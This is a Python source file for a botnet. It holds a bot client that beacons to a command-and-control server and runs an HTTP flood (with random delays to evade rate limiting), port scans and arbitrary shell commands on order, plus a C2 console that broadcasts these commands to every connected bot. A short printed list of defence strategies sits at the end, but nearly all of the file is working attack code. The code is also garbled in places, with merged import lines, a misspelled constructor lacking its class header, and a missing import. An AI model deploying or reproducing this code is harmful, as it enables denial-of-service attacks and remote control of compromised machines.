import socket
import threading
import time
import randomimport hashlib
import base64from datetime import datetime
from urllib.parse import urlparse

"individual bot/agent in the bot"

def__int__(self,c2_server="172.0.0.1", c2_port=5555):
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.bot_id = self.generate_bot_id()
        self.running = True
        self.current_task = None
        self.task_thread = None

        
    def generate_bot_id(self):
        """Generate unique bot identifier"""
        data = f"{socket.gethostname()}-{time.time()}-{random.randint(1000,9999)}"
        return hashlib.md5(data.encode()).hexdigest()[:16]
    
    def register_with_c2(self, sock):
        """Send registration beacon to C2"""
        sys_info = {
            'id': self.bot_id,
            'hostname': socket.gethostname(),
            'platform': sys.platform,
            'cpu_count': 4,  # Simulated
            'timestamp': datetime.now().isoformat()
        }
        # Send encrypted registration
        reg_data = base64.b64encode(str(sys_info).encode()).decode()
        sock.send(f"REGISTER:{reg_data}\n".encode())
    
    def execute_command(self, command):
        """Execute commands from C2"""
        parts = command.strip().split()
        if not parts:
            return
        
        cmd = parts[0].upper()
        
        if cmd == "PING":
            return f"PONG {self.bot_id}"
        
        elif cmd == "DDOS" and len(parts) >= 3:
            # DDoS attack: DDOS <target> <duration> <threads>
            target = parts[1]
            duration = int(parts[2]) if len(parts) > 2 else 60
            threads = int(parts[3]) if len(parts) > 3 else 10
            
            self.start_ddos(target, duration, threads)
            return f"DDoS started against {target}"
        
        elif cmd == "STOP":
            self.stop_ddos()
            return "DDoS stopped"
        
        elif cmd == "SCAN" and len(parts) >= 2:
            # Port scan: SCAN <ip_range>
            return self.port_scan(parts[1])
        
        elif cmd == "SPREAD":
            # Lateral movement simulation
            return self.attempt_spread()
        
        elif cmd == "EXEC" and len(parts) >= 2:
            # Execute shell command
            import subprocess
            try:
                result = subprocess.run(' '.join(parts[1:]), shell=True, 
                                      capture_output=True, text=True, timeout=30)
                return result.stdout or "Command executed"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "UPDATE":
            # Self-update from C2
            return "Update simulation complete"
        
        elif cmd == "UNINSTALL":
            self.running = False
            return "Bot uninstalling..."
        
        return "Unknown command"
    
    def start_ddos(self, target, duration, threads):
        """Launch DDoS attack"""
        self.stop_ddos()  # Stop any existing attack
        
        parsed = urlparse(target if '://' in target else f"http://{target}")
        host = parsed.hostname or target
        port = parsed.port or 80
        
        self.current_task = {
            'type': 'ddos',
            'target': host,
            'port': port,
            'duration': duration,
            'threads': threads,
            'start_time': time.time()
        }
        
        self.task_thread = threading.Thread(target=self.ddos_worker, daemon=True)
        self.task_thread.start()
    
    def ddos_worker(self):
        """DDoS attack worker thread"""
        task = self.current_task
        end_time = task['start_time'] + task['duration']
        
        packets_sent = 0
        
        while time.time() < end_time and self.current_task:
            try:
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                # Attempt connection (SYN flood simulation)
                sock.connect((task['target'], task['port']))
                
                # HTTP GET flood
                http_request = (
                    f"GET /{random.randint(1000,9999)} HTTP/1.1\r\n"
                    f"Host: {task['target']}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                sock.send(http_request.encode())
                
                packets_sent += 1
                
                # Random delay to evade rate limiting
                time.sleep(random.uniform(0.01, 0.1))
                
            except:
                pass
            finally:
                try:
                    sock.close()
                except:
                    pass
        
        print(f"[Bot {self.bot_id}] DDoS complete: {packets_sent} packets sent")
    
    def stop_ddos(self):
        """Stop current DDoS attack"""
        self.current_task = None
        if self.task_thread and self.task_thread.is_alive():
            # Thread will exit on next iteration check
            pass
    
    def port_scan(self, ip_range):
        """Simple port scan"""
        open_ports = []
        target_ip = ip_range.split('/')[0]  # Simplified
        
        common_ports = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 8080]
        
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        
        return f"Open ports on {target_ip}: {open_ports}"
    
    def attempt_spread(self):
        """Simulate lateral movement"""
        methods = []
        
        # Try common credentials
        common_creds = [
            ('admin', 'admin'),
            ('root', 'password'),
            ('administrator', 'P@ssw0rd')
        ]
        
        # SSH brute force simulation
        methods.append("SSH brute force attempted")
        
        # SMB exploit simulation
        methods.append("EternalBlue exploit attempted")
        
        return f"Spread attempts: {methods}"
    
    def run(self):
        """Main bot loop"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.c2_server, self.c2_port))
                sock.settimeout(300)  # 5 minute timeout
                
                # Register
                self.register_with_c2(sock)
                
                while self.running:
                    # Wait for commands
                    data = sock.recv(4096).decode().strip()
                    if not data:
                        break
                    
                    print(f"[Bot {self.bot_id}] Received: {data}")
                    
                    # Execute and respond
                    result = self.execute_command(data)
                    response = f"RESULT:{self.bot_id}:{base64.b64encode(result.encode()).decode()}\n"
                    sock.send(response.encode())
                
            except Exception as e:
                print(f"[Bot {self.bot_id}] Connection error: {e}")
                time.sleep(30)  # Reconnect delay
            
            finally:
                try:
                    sock.close()
                except:
                    pass


class BotnetC2:
    """
    Command & Control server for botnet
    """
    
    def __init__(self, host="0.0.0.0", port=5555):
        self.host = host
        self.port = port
        self.bots = {}  # bot_id -> {info, socket}
        self.running = True
        
    def start(self):
        """Start C2 server"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(100)
        
        print(f"[*] Botnet C2 Server listening on {self.host}:{self.port}")
        print(f"[*] Commands: bots, ddos <target>, scan <ip>, exec <cmd>, update, uninstall")
        
        # Command interface thread
        cmd_thread = threading.Thread(target=self.command_interface, daemon=True)
        cmd_thread.start()
        
        while self.running:
            conn, addr = sock.accept()
            handler = threading.Thread(target=self.handle_bot, args=(conn, addr))
            handler.start()
    
    def handle_bot(self, conn, addr):
        """Handle individual bot connection"""
        bot_id = None
        
        try:
            while True:
                data = conn.recv(4096).decode().strip()
                if not data:
                    break
                
                if data.startswith("REGISTER:"):
                    # Parse registration
                    reg_data = base64.b64decode(data[9:]).decode()
                    # Extract bot ID
                    if 'id' in reg_data:
                        import ast
                        try:
                            info = ast.literal_eval(reg_data)
                            bot_id = info.get('id', 'unknown')
                            self.bots[bot_id] = {
                                'info': info,
                                'socket': conn,
                                'last_seen': time.time()
                            }
                            print(f"[+] Bot registered: {bot_id} from {addr}")
                        except:
                            pass
                
                elif data.startswith("RESULT:"):
                    parts = data.split(':', 2)
                    if len(parts) >= 3:
                        bid = parts[1]
                        result = base64.b64decode(parts[2]).decode()
                        print(f"\n[Result from {bid}]: {result}")
                        print("C2> ", end='', flush=True)
                        
        except Exception as e:
            print(f"[-] Bot handler error: {e}")
        finally:
            if bot_id and bot_id in self.bots:
                del self.bots[bot_id]
            conn.close()
    
    def command_interface(self):
        """Interactive command interface"""
        time.sleep(1)  # Wait for server startup
        
        while self.running:
            try:
                cmd = input("\nC2> ").strip()
                if not cmd:
                    continue
                
                parts = cmd.split()
                command = parts[0].lower()
                
                if command == "bots":
                    print(f"\n[+] Connected bots: {len(self.bots)}")
                    for bid, info in self.bots.items():
                        print(f"    {bid}: {info['info'].get('hostname', 'unknown')}")
                
                elif command == "ddos" and len(parts) >= 2:
                    target = parts[1]
                    duration = parts[2] if len(parts) > 2 else "60"
                    self.broadcast_command(f"DDOS {target} {duration}")
                    print(f"[+] DDoS command sent to {len(self.bots)} bots")
                
                elif command == "scan" and len(parts) >= 2:
                    self.broadcast_command(f"SCAN {parts[1]}")
                
                elif command == "exec" and len(parts) >= 2:
                    shell_cmd = ' '.join(parts[1:])
                    self.broadcast_command(f"EXEC {shell_cmd}")
                
                elif command == "update":
                    self.broadcast_command("UPDATE")
                
                elif command == "uninstall":
                    self.broadcast_command("UNINSTALL")
                    print("[+] Uninstall command sent")
                
                elif command == "quit":
                    self.running = False
                    break
                    
            except Exception as e:
                print(f"[-] Command error: {e}")
    
    def broadcast_command(self, command):
        """Send command to all bots"""
        for bot_id, info in list(self.bots.items()):
            try:
                info['socket'].send(f"{command}\n".encode())
            except:
                # Remove dead bot
                del self.bots[bot_id]


def demonstrate_defense():
    """Show botnet defense strategies"""
    print("\n" + "="*60)
    print("BOTNET/DDoS DEFENSE")
    print("="*60)
    print("""
1. DDoS MITIGATION
   - Rate limiting at edge
   - CDN with DDoS protection (CloudFlare, Akamai)
   - Anycast network distribution
   - Traffic scrubbing centers
   
2. BOTNET DETECTION
   - Network traffic analysis (beaconing detection)
   - DNS monitoring for DGA domains
   - Behavioral analysis of endpoints
   - Honeypots to capture bot samples
   
3. PREVENT INFECTION
   - Patch management (prevent exploit vectors)
   - Email security (primary infection vector)
   - Application whitelisting
   - Principle of least privilege
   
4. TAKE DOWN
   - Sinkhole C2 domains
   - Seize server infrastructure
   - Notify hosting providers
   - Law enforcement coordination
   
5. INCIDENT RESPONSE
   - Identify patient zero
   - Isolate infected systems
   - Block C2 IPs/domains at firewall
   - Scan for persistence mechanisms
""")

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--c2", action="store_true", help="Run as C2 server")
    parser.add_argument("--bot", action="store_true", help="Run as bot client")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5555)
    args = parser.parse_args()
    
    if args.c2:
        c2 = BotnetC2(args.host, args.port)
        c2.start()
    elif args.bot:
        bot = BotClient(args.host, args.port)
        bot.run()
    else:
        demonstrate_defense()

if __name__ == "__main__":
    main()